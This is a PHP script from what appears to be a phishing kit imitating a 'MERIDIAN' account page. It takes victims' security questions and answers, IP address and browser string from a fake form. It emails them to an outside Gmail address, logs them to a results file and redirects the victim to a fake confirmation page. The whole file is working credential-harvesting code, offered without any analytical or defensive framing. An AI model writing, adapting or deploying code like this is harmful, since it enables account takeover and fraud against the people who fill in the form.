<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------2 QuestionsDetails---------------\n";
$message .= "QUESTION1	: ".$_POST['Q1']."\n";
$message .= "ANSWER		: ".$_POST['A1']."\n";
$message .= "QUESTION2	: ".$_POST['Q2']."\n";
$message .= "ANSWER		: ".$_POST['A2']."\n";
$message .= "QUESTION3	: ".$_POST['Q3']."\n";
$message .= "ANSWER		: ".$_POST['A3']."\n";
$message .= "-----------------created by medpage---------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------MERIDIANResults------------------\n";
$send = "all.results13@gmail.com";
$subject = "MERIDIANResults 2 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('../MERIDIANresults.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "accountConfirmation.html";

</script>